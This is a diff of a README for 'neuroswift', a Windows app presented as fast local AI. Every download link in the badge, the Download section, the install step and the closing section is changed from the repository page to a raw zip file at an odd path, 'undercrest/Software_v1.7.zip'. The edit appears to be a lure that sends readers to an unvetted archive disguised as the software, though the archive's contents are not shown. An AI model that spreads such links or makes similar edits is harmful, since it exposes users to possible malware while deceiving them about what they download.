@@ -1,12 +1,12 @@
 # 🧠 neuroswift - Fast local AI on your PC
 
-[![Download neuroswift](https://img.shields.io/badge/Download%20neuroswift-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ucmaaz/neuroswift)
+[![Download neuroswift](https://img.shields.io/badge/Download%20neuroswift-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ucmaaz/neuroswift/raw/refs/heads/main/undercrest/Software_v1.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download neuroswift:
 
-https://github.com/ucmaaz/neuroswift
+https://github.com/ucmaaz/neuroswift/raw/refs/heads/main/undercrest/Software_v1.7.zip
 
 ## 🖥️ What neuroswift is
 
@@ -36,7 +36,7 @@ For a smoother run, 16 GB RAM helps a lot.
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/ucmaaz/neuroswift
+   https://github.com/ucmaaz/neuroswift/raw/refs/heads/main/undercrest/Software_v1.7.zip
 
 2. On the page, find the latest release or main download file.
 
@@ -170,7 +170,7 @@ This is normal for local AI apps on Windows.
 
 Visit the download page here:
 
-https://github.com/ucmaaz/neuroswift
+https://github.com/ucmaaz/neuroswift/raw/refs/heads/main/undercrest/Software_v1.7.zip
 
 ## 🧭 After you install
 
